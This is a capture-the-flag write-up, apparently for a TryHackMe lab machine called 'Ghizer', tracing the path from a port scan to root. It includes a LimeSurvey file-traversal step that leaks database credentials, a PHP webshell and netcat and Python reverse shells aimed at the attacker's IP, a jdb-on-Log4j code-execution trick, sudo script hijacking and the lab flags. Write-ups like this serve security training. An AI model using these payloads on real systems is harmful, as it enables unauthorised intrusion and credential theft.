# Ghizer 

> VOiD | Friday 11 February 2022 12:38:34 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.201.38

## Rustscan
```bash
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack
80/tcp    open  http    syn-ack
443/tcp   open  https   syn-ack
18002/tcp open  unknown syn-ack
45559/tcp open  unknown syn-ack
46819/tcp open  unknown syn-ack
```

## PORT 80 [http]
```bash
/admin
admin:password

veronica
msf6 auxiliary(scanner/http/limesurvey_zip_traversals) > 
set file ./application/config/config.php

			'username' => 'Anny',
			'password' => 'P4$W0RD!!#S3CUr3!',
			'charset' => 'utf8mb4',
Anny:P4$W0RD!!#S3CUr3!
```

## PORT 443 [https]
```bash
Welcome to my WordPress antihackers!

I use the plugin WPS Hide Login for hide wp-login!

try harder!

? it’s very important :3333

/hellodolly.php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.253.221/4444 0>&1'")
?>
```

## USER [www-data]
```bash
cat wp-config.php

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password' );


*  *	* * *	root	cd /root/Lucrecia && bash lucre.sh


www-data@ubuntu:/home/veronica$ jdb -attach localhost:18001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
> 
Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0

Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc 10.8.253.221 4444 -e /bin/sh")

```

## USER [veronica]
```bash
cat user.txt 
THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}

veronica@ubuntu:~$ ls -la base.py 
-rw-r--r-- 1 root root 86 Jul 23  2020 base.py
veronica@ubuntu:~$ 
veronica@ubuntu:~$ cat base.py 
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)

User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py

sudo /usr/bin/python3.5 /home/veronica/base.py

```

```py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.253.221",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

## USER [root]
```bash
cat /root/root.txt
THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}

```